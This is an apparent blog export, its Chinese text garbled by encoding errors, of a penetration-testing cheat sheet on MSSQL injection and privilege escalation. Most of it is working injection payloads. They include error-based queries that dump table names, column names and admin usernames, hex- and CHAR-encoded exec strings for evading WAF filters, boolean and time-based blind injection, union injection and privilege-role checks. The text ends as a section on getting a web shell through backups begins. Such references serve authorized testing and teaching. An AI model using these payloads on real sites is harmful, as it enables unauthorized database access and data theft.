ç›¸å…³åŸºç¡€ç®€ä»‹ ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:1:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"1.1 é»˜è®¤åº“ä»‹ç» master - ç”¨äºè®°å½•æ‰€æœ‰ SQL Server ç³»ç»Ÿçº§åˆ«çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯ç”¨äºæ§åˆ¶ç”¨æˆ·æ•°æ®åº“å’Œæ•°æ®æ“ä½œã€‚ model - SQL Server ä¸ºç”¨æˆ·æ•°æ®åº“æä¾›çš„æ ·æ¿ï¼Œæ–°çš„ç”¨æˆ·æ•°æ®åº“éƒ½ä»¥ model æ•°æ®åº“ä¸ºåŸºç¡€ msdb - ç”± Enterprise Manager å’Œ Agent ä½¿ç”¨ï¼Œè®°å½•ç€ä»»åŠ¡è®¡åˆ’ä¿¡æ¯ã€äº‹ä»¶å¤„ç†ä¿¡æ¯ã€æ•°æ®å¤‡ä»½åŠæ¢å¤ä¿¡æ¯ã€è­¦å‘ŠåŠå¼‚å¸¸ä¿¡æ¯ã€‚ tempdb - å®ƒä¸ºä¸´æ—¶è¡¨å’Œå…¶ä»–ä¸´æ—¶å·¥ä½œæä¾›äº†ä¸€ä¸ªå­˜å‚¨åŒºã€‚ ä¿¡æ¯ è¿™é‡Œæˆ‘ä»¬ç»å¸¸è¦æ‰“äº¤é“çš„åº“ä¹Ÿå°±æ˜¯ masterï¼Œå…¶ä¸­å‚¨å­˜äº†æ‰€æœ‰æ•°æ®åº“åä¸å­˜å‚¨è¿‡ç¨‹ã€‚ç±»æ¯”äº MySQL ä¸­çš„ information_schema å…ƒæ•°æ®åº“ã€‚ ä»¥ master åº“ä¸ºä¾‹å¯ä»¥çœ‹åˆ°ä¸Šé¢å‡ ä¸ªç±»åˆ«ï¼Œå…¶ä¸­è§†å›¾è¡¨ master.dbo.sysdatabases å‚¨å­˜æ‰€æœ‰æ•°æ®åº“åï¼Œå…¶ä»–æ•°æ®åº“çš„è§†å›¾åˆ™å‚¨å­˜å®ƒæœ¬åº“çš„è¡¨åä¸åˆ—åã€‚æ¯ä¸€ä¸ªåº“çš„è§†å›¾è¡¨éƒ½æœ‰ syscolumns å­˜å‚¨ç€æ‰€æœ‰çš„å­—æ®µï¼Œå¯ç¼–ç¨‹æ€§å‚¨å­˜ç€æˆ‘ä»¬çš„å‡½æ•°ã€‚ select name from master.dbo.sysdatabases; æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“çš„åç§°ã€‚ ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:1:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"1.2 å­—æ®µä»‹ç» select top 1 name,xtype from sysobjects; xtype å¯ä»¥æ˜¯ä¸‹åˆ—å¯¹è±¡ç±»å‹ä¸­çš„ä¸€ç§ï¼š C = CHECK çº¦æŸ D = é»˜è®¤å€¼æˆ– DEFAULT çº¦æŸ F = FOREIGN KEY çº¦æŸ L = æ—¥å¿— FN = æ ‡é‡å‡½æ•° IF = å†…åµŒè¡¨å‡½æ•° P = å­˜å‚¨è¿‡ç¨‹ PK = PRIMARY KEY çº¦æŸï¼ˆç±»å‹æ˜¯ Kï¼‰ RF = å¤åˆ¶ç­›é€‰å­˜å‚¨è¿‡ç¨‹ S = ç³»ç»Ÿè¡¨ TF = è¡¨å‡½æ•° TR = è§¦å‘å™¨ U = ç”¨æˆ·è¡¨ UQ = UNIQUE çº¦æŸï¼ˆç±»å‹æ˜¯ Kï¼‰ V = è§†å›¾ X = æ‰©å±•å­˜å‚¨è¿‡ç¨‹ ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:1:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"2 SQL Server ä¿¡æ¯æ”¶é›† ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"2.1 æƒé™åˆ¤æ–­ SQL Server å†…éƒ¨æŒ‰ä½œç”¨èŒƒå›´æ¥åˆ†æœ‰ä¸‰å¤§ä¸»ä½“: Windows çº§åˆ«ä¸»ä½“ æœåŠ¡å™¨çº§åˆ«ä¸»ä½“ æ•°æ®åº“çº§åˆ«ä¸»ä½“ 2.1.1 æœåŠ¡å™¨çº§åˆ« åœ¨å¾®è½¯çš„å®˜æ–¹æ–‡æ¡£ä¸­å¯ä»¥çœ‹åˆ°ï¼Œ IS_SRVROLEMEMBER ( 'role' [ , 'login' ] ) ï¼Œå‡½æ•° role çš„æœ‰æ•ˆå€¼æ˜¯ç”¨æˆ·å®šä¹‰çš„æœåŠ¡å™¨è§’è‰²å’Œä»¥ä¸‹å›ºå®šæœåŠ¡å™¨è§’è‰²ï¼š è¿”å›ç±»å‹ï¼š è¿”å›å€¼ æè¿° 0 login ä¸æ˜¯ role çš„æˆå‘˜ã€‚ 1 login æ˜¯ role çš„æˆå‘˜ã€‚ NULL role æˆ– login æ— æ•ˆï¼Œæˆ–è€…æ²¡æœ‰æŸ¥çœ‹è§’è‰²æˆå‘˜èº«ä»½çš„æƒé™ã€‚ æœ€ç»ˆæˆ‘ä»¬å¯ä»¥æ„é€ è¯­å¥ï¼š and 1=(select is_srvrolemember('sysadmin')) and 1=(select is_srvrolemember('serveradmin')) and 1=(select is_srvrolemember('setupadmin')) and 1=(select is_srvrolemember('securityadmin')) and 1=(select is_srvrolemember('diskadmin')) and 1=(select is_srvrolemember('bulkadmin')) åœ¨ SQLMap ä¸­ä½¿ç”¨ â€“is-dba å‘½ä»¤å¯ä»¥åˆ¤æ–­æ˜¯å¦ä¸ºç®¡ç†å‘˜æƒé™ select * from admin where id =1 AND 5560 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (IS_SRVROLEMEMBER(CHAR(115)+CHAR(121)+CHAR(115)+CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110))=1) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113))) 2.1.2 æ•°æ®åº“çº§åˆ«çš„è§’è‰² select IS_MEMBER('db_owner') ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"2.2 åŸºæœ¬ä¿¡æ¯ @@version // æ•°æ®åº“ç‰ˆæœ¬ user //è·å–å½“å‰æ•°æ®åº“ç”¨æˆ·å db_name() // å½“å‰æ•°æ®åº“å å…¶ä¸­db_name(N)å¯ä»¥æ¥éå†å…¶ä»–æ•°æ®åº“ ;select user //æŸ¥è¯¢æ˜¯å¦æ”¯æŒå¤šè¯­å¥ ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"2.3 åˆ¤æ–­ç«™åº“åˆ†ç¦» select * from info where id='1' and host_name()=@@servername;--' æœ€ç®€å•çš„æ–¹æ³•ï¼Œå½“ç„¶ä½ å¯ä»¥è°ƒç”¨ xp_cmdshell å°±å¯ä»¥é€šè¿‡ cmd æ¥åˆ¤æ–­ã€‚ é€šè¿‡ç®€å•çš„åˆ¤æ–­æ•°æ®åº“ç‰ˆæœ¬ï¼Œå½“å‰ç”¨æˆ·æƒé™ï¼Œæˆ‘ä»¬å°±å¯ä»¥æƒ³ä¸‹ä¸€æ­¥æ€ä¹ˆå»åšï¼Œæ¯”å¦‚ 2005 çš„ xp_cmdshell çš„æƒé™ä¸€èˆ¬æ˜¯ system è€Œ 2008 çš„æƒé™ä¸€èˆ¬æ˜¯ ntauthority\\network service ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:3","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"3 SQL Server è¯­æ³• ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"3.1 æ³¨é‡Šç¬¦å· /* -- ;%00 ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"3.2 ç©ºç™½å­—ç¬¦ 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20 /**/ ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"3.3 è¿ç®—ç¬¦å· + åŠ æ³•è¿ç®— - å‡æ³•è¿ç®— * ä¹˜æ³•è¿ç®— / é™¤æ³•è¿ç®—ï¼Œå¦‚æœä¸¤ä¸ªè¡¨è¾¾å¼å€¼éƒ½æ˜¯æ•´æ•°ï¼Œé‚£ä¹ˆç»“æœåªå–æ•´æ•°å€¼ï¼Œå°æ•°å€¼å°†ç•¥å» % å–æ¨¡è¿ç®—ï¼Œè¿”å›ä¸¤æ•°ç›¸é™¤åçš„ä½™æ•° \u0026 ä½ä¸é€»è¾‘è¿ç®—ï¼Œä»ä¸¤ä¸ªè¡¨è¾¾å¼ä¸­å–å¯¹åº”çš„ä½ã€‚å½“ä¸”ä»…å½“è¾“å…¥è¡¨è¾¾å¼ä¸­ä¸¤ä¸ªä½çš„å€¼éƒ½ä¸º 1 æ—¶ï¼Œç»“æœä¸­çš„ä½æ‰è¢«è®¾ç½®ä¸º 1ï¼Œå¦åˆ™ï¼Œç»“æœä¸­çš„ä½è¢«è®¾ç½®ä¸º 0 | ä½æˆ–é€»è¾‘è¿ç®—ï¼Œä»ä¸¤ä¸ªè¡¨è¾¾å¼ä¸­å–å¯¹åº”çš„ä½ã€‚å¦‚æœè¾“å…¥è¡¨è¾¾å¼ä¸­ä¸¤ä¸ªä½åªè¦æœ‰ä¸€ä¸ªçš„å€¼ä¸º 1 æ—¶ï¼Œç»“æœçš„ä½å°±è¢«è®¾ç½®ä¸º 1ï¼Œåªæœ‰å½“ä¸¤ä¸ªä½çš„å€¼éƒ½ä¸º 0 æ—¶ï¼Œç»“æœä¸­çš„ä½æ‰è¢«è®¾ç½®ä¸º 0 ^ ä½å¼‚æˆ–è¿ç®—ï¼Œä»ä¸¤ä¸ªè¡¨è¾¾å¼ä¸­å–å¯¹åº”çš„ä½ã€‚å¦‚æœè¾“å…¥è¡¨è¾¾å¼ä¸­ä¸¤ä¸ªä½åªæœ‰ä¸€ä¸ªçš„å€¼ä¸º 1 æ—¶ï¼Œç»“æœä¸­çš„ä½å°±è¢«è®¾ç½®ä¸º 1ï¼›åªæœ‰å½“ä¸¤ä¸ªä½çš„å€¼éƒ½ä¸º 0 æˆ– 1 æ—¶ï¼Œç»“æœä¸­çš„ä½æ‰è¢«è®¾ç½®ä¸º0 = ç­‰äº \u003c\u003e ä¸ç­‰äº \u003e å¤§äº != ä¸ç­‰äº \u003c å°äº !\u003c ä¸å°äº \u003e= å¤§äºæˆ–ç­‰äº !\u003e ä¸å¤§äº \u003c= å°äºæˆ–ç­‰äº ALL å¦‚æœä¸€ç»„çš„æ¯”è¾ƒéƒ½ä¸º trueï¼Œåˆ™æ¯”è¾ƒç»“æœä¸º true AND å¦‚æœä¸¤ä¸ªå¸ƒå°”è¡¨è¾¾å¼éƒ½ä¸º trueï¼Œåˆ™ç»“æœä¸º trueï¼›å¦‚æœå…¶ä¸­ä¸€ä¸ªè¡¨è¾¾å¼ä¸º falseï¼Œåˆ™ç»“æœä¸º false ANY å¦‚æœä¸€ç»„çš„æ¯”è¾ƒä¸­ä»»ä½•ä¸€ä¸ªä¸º trueï¼Œåˆ™ç»“æœä¸º true BETWEEN å¦‚æœæ“ä½œæ•°åœ¨æŸä¸ªèŒƒå›´ä¹‹å†…ï¼Œé‚£ä¹ˆç»“æœä¸º true EXISTS å¦‚æœå­æŸ¥è¯¢ä¸­åŒ…å«äº†ä¸€äº›è¡Œï¼Œé‚£ä¹ˆç»“æœä¸º true IN å¦‚æœæ“ä½œæ•°ç­‰äºè¡¨è¾¾å¼åˆ—è¡¨ä¸­çš„ä¸€ä¸ªï¼Œé‚£ä¹ˆç»“æœä¸º true LIKE å¦‚æœæ“ä½œæ•°ä¸æŸç§æ¨¡å¼ç›¸åŒ¹é…ï¼Œé‚£ä¹ˆç»“æœä¸º true NOT å¯¹ä»»ä½•å…¶ä»–å¸ƒå°”è¿ç®—ç¬¦çš„ç»“æœå€¼å–å OR å¦‚æœä¸¤ä¸ªå¸ƒå°”è¡¨è¾¾å¼ä¸­çš„ä»»ä½•ä¸€ä¸ªä¸º trueï¼Œé‚£ä¹ˆç»“æœä¸º true SOME å¦‚æœåœ¨ä¸€ç»„æ¯”è¾ƒä¸­ï¼Œæœ‰äº›æ¯”è¾ƒä¸º trueï¼Œé‚£ä¹ˆç»“æœä¸º true ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:3","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"3.4 è¯­æ³•å®šä¹‰ç¬¦å· \u003c \u003e å°–æ‹¬å·ï¼Œç”¨äºåˆ†éš”å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²ä¸ºè¯­æ³•å…ƒç´ çš„åç§°ï¼ŒSQL è¯­è¨€çš„éç»ˆç»“ç¬¦ã€‚ ::= å®šä¹‰æ“ä½œç¬¦ã€‚ç”¨åœ¨ç”Ÿæˆè§„åˆ™ä¸­ï¼Œåˆ†éš”è§„åˆ™å®šä¹‰çš„å…ƒç´ å’Œè§„åˆ™å®šä¹‰ã€‚ è¢«å®šä¹‰çš„å…ƒç´ ä½äºæ“ä½œç¬¦çš„å·¦è¾¹ï¼Œè§„åˆ™å®šä¹‰ä½äºæ“ä½œç¬¦çš„å³è¾¹ã€‚ [ ] æ–¹æ‹¬å·è¡¨ç¤ºè§„åˆ™ä¸­çš„å¯é€‰å…ƒç´ ã€‚æ–¹æ‹¬å·ä¸­çš„è§„åˆ™éƒ¨åˆ†å¯ä»¥æ˜ç¡®æŒ‡å®šä¹Ÿå¯ä»¥çœç•¥ã€‚ { } èŠ±æ‹¬å·èšé›†è§„åˆ™ä¸­çš„å…ƒç´ ã€‚åœ¨èŠ±æ‹¬å·ä¸­çš„è§„åˆ™éƒ¨åˆ†å¿…é¡»æ˜ç¡®æŒ‡å®šã€‚ () æ‹¬å·æ˜¯åˆ†ç»„è¿ç®—ç¬¦ ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:4","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"4 MSSQL æ³¨å…¥ ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:4:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"4.1 æ˜¾é”™æ³¨å…¥ 4.1.1 åŸç† MSSQL æŠ¥é”™æ³¨å…¥åˆ©ç”¨çš„å°±æ˜¯æ˜¾ç¤ºæˆ–éšå¼è½¬æ¢æ¥æŠ¥é”™æ³¨å…¥ï¼Œæ¯”å¦‚ä»¥ä¸‹å°±æ˜¯å…¸å‹çš„éšå¼è½¬æ¢ select * from admin where id =1 and (select user)\u003e0-- select * from admin where id =1|(select user)-- åœ¨å°† nvarchar å€¼ 'dbo' è½¬æ¢æˆæ•°æ®ç±»å‹ int æ—¶å¤±è´¥ã€‚ æ˜¾ç¤ºè½¬æ¢ä¹Ÿå°±æ˜¯åˆ©ç”¨å‡½æ•°æ¥è½¬æ¢ï¼Œæˆ‘ä»¬ç»å¸¸ç”¨åˆ°çš„ä¸¤ä¸ªå‡½æ•°å°±æ˜¯ cast å’Œ convert select * from admin where id =1 (select CAST(USER as int)) select * from admin where id =1 (select convert(int,user)) åˆ¤æ–­å½“å‰æ•°æ®åº“ï¼š id=1'and db_name()\u003e0;-- çˆ†è¡¨åï¼š id=1' and 1=(select top 1 name from sysobjects where xtype='u' and name !='info');-- çˆ†åˆ—åï¼š id=1' and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'admin') and name\u003c\u003e'id');-- çˆ†æ•°æ®ï¼š id=1' and 1=(select top 1 username from admin);-- 4.1.2 å…¶å®ƒç”¨æ³• å½“ç„¶æŸ¥è¯¢æ•°æ®åº“çš„æ‰€æœ‰è¡¨è¿˜å¯ä»¥ä½¿ç”¨ INFORMATION_SCHEMA.TABLES select * from INFORMATION_SCHEMA.TABLES select * from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='admin' id=1 and 1=(select top 1 table_name from information_schema.tables);-- è¦åˆ¤æ–­å½“å‰è¡¨åå’Œåˆ—åï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ having 1=1 å’Œ group by id=1 having 1=1 çˆ†å‡ºå½“å‰è¡¨å’Œå­—æ®µï¼š id=1 group by info.id,info.name having 1=1 4.1.3 ç®€å•æ³¨å…¥ç»•è¿‡ è¿™é‡Œå¼•å…¥ä¸€ä¸ª declare å‡½æ•°ï¼Œä»–æ˜¯ mssql å£°æ˜å±€éƒ¨å˜é‡çš„å‡½æ•°ï¼Œæˆ‘ä»¬ç»å¸¸ç”¨å®ƒæ¥ç»•è¿‡ waf å¯¹ä¸€äº›å…³é”®è¯çš„æ‹¦æˆª select * from admin where id =1;declare @a nvarchar(2000) set @a='select convert(int,@@version)' exec(@a) -- declare å®šä¹‰å˜é‡ï¼Œset è®¾ç½®å˜é‡å€¼ï¼Œexec æ‰§è¡Œå˜é‡ å˜é‡çš„å€¼æ˜¯æ”¯æŒ hex å’Œ ascii ç çš„ï¼Œå½“è¿‡æ»¤å¼•å·æˆ‘ä»¬å°±å¯ä»¥è¿™ä¹ˆç”¨æŠŠæˆ‘ä»¬çš„è¯­å¥ç¼–ç ä¸€ä¸‹ select * from admin where id =1;declare @s varchar(2000) set @s=0x73656c65637420636f6e7665727428696e742c404076657273696f6e29 exec(@s)-- select * from admin where id =1;declare @s varchar(2000) set @s= CHAR(115) + CHAR(101) + CHAR(108) + CHAR(101) + CHAR(99) + CHAR(116) + CHAR(32) + CHAR(99) + CHAR(111) + CHAR(110) + CHAR(118) + CHAR(101) + CHAR(114) + CHAR(116) + CHAR(40) + CHAR(105) + CHAR(110) + CHAR(116) + CHAR(44) + CHAR(64) + CHAR(64) + CHAR(118) + CHAR(101) + CHAR(114) + CHAR(115) + CHAR(105) + CHAR(111) + CHAR(110) + CHAR(41) exec(@s)-- ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:4:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"4.2 ç›²æ³¨ å…¶å®è·Ÿ mysql å¤§åŒå°å¼‚æ— éå°±æ˜¯åˆ†å‰²å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œä½†æ˜¯ mssql çš„ç›²æ³¨å¥—è·¯ç¡®å®æ²¡é‚£ä¹ˆå¤šã€‚ 4.2.1 å¸ƒå°”ç›²æ³¨ id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) \u003e= 109 4.2.2 æ—¶é—´ç›²æ³¨ id=1;if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'-- id=1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))\u003e1 WAITFOR DELAY '0:0:5'-- ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:4:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"4.2 è”åˆæ³¨å…¥ mssql è”åˆæ³¨å…¥æˆ‘ä»¬ä¸€èˆ¬ä¸ä½¿ç”¨æ•°å­—å ä½ï¼Œè€Œæ˜¯ nullï¼Œå› ä¸ºä½¿ç”¨æ•°å­—å ä½å¯èƒ½ä¼šå‘ç”Ÿéšå¼è½¬æ¢ id=1 union select null,name,pass from info ä¹Ÿå¯ä»¥åˆ©ç”¨å¦‚ä¸‹æ–¹æ³•ï¼š id=1 SELECT 1 UNION (select CAST(USER as int)) ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:4:3","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"5 MSSQL ææƒ ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:5:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"5.1 å¤‡ä»½æ‹¿ shell å¤‡ä»½æ‹¿ shell ä¹Ÿå°±æ¶‰åŠåˆ°äº†æƒé™çš„é—®é¢˜ï¼ŒSA æƒé™ä¸ç”¨è¯´æ²¡æœ‰é™æƒçš„è¯åŸºæœ¬èƒ½åšä»»ä½•äº‹æƒ…äº†ï¼Œå®ƒæ•°æ®åº“æƒé™æ˜¯ db_ownerï¼Œå½“ç„¶å…¶ä»–ç”¨æˆ·å¦‚æœä¹Ÿæ‹¥æœ‰ db_owner åŸºæœ¬ä¹Ÿå¯ä»¥é€šè¿‡å¤‡ä»½æ‹¿ä¸‹ shellï¼Œä½†æ˜¯åœ¨è®¾ç½®ç›®å½•æƒé™åå°±ä¸è¡Œäº†ã€‚ 5.1.1 è·¯å¾„çš„å¯»æ‰¾ éœ€è¦è·¯å¾„çš„æˆ‘ä»¬ä¸€èˆ¬æœ‰å‡ ä¸ªæ€è·¯ï¼š æŠ¥é”™å¯»æ‰¾ å­—å…¸ æ—ç«™ä¿¡æ¯æ”¶é›† è°ƒç”¨å‚¨å­˜è¿‡ç¨‹æ¥æœç´¢ è¯»é…ç½®æ–‡ä»¶ è¿™é‡Œæˆ‘ä»¬ç€é‡è®¨è®ºä¸€ä¸‹å‚¨å­˜è¿‡ç¨‹ä¹Ÿå°±æ˜¯è¿™äº›å‡½æ•°æ¥æ‰¾æˆ‘ä»¬çš„ç½‘ç«™æ ¹ç›®å½•ã€‚ä¸€èˆ¬æˆ‘ä»¬å¯ä»¥ç”¨ 